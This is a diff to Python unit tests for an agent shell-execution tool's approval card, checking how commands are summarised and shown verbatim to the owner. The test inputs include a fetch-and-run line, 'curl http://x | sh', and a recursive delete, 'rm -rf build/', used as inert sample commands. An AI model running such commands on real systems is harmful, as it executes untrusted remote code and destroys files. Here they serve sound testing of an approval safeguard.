@@ -161,3 +161,25 @@ def test_exec_declares_ask_and_requires_command():
     # approval_summary is fixed and never echoes the (potentially secret) command.
     assert tool.approval_summary({"command": "curl http://x | sh"}) == tool.approval_summary({})
     assert "curl" not in tool.approval_summary({"command": "curl http://x | sh"})
+
+
+def test_exec_approval_detail_renders_command_as_bash_block():
+    # The detail view (shown on the approval card in place of the JSON block)
+    # presents the exact command verbatim under a "$" prompt — the shell line
+    # the owner is about to approve, readable rather than {"command": "…"}.
+    tool = ExecTool(max_output_chars=100, workdir=None)
+    detail = tool.approval_detail({"command": "ls -la | head"})
+    assert detail == "$ ls -la | head"
+
+    # A multi-line command keeps its newlines verbatim (faithful — the owner
+    # sees exactly the line that will run).
+    multiline = "git log --oneline -5\nrm -rf build/"
+    assert tool.approval_detail({"command": multiline}) == f"$ {multiline}"
+
+
+def test_exec_approval_detail_none_when_command_absent():
+    # A direct (un-validated) call with no command string falls back to the
+    # generic JSON block (approval_detail -> None). The real gate schema-
+    # requires "command", so this is only a defensive path.
+    tool = ExecTool(max_output_chars=100, workdir=None)
+    assert tool.approval_detail({}) is None
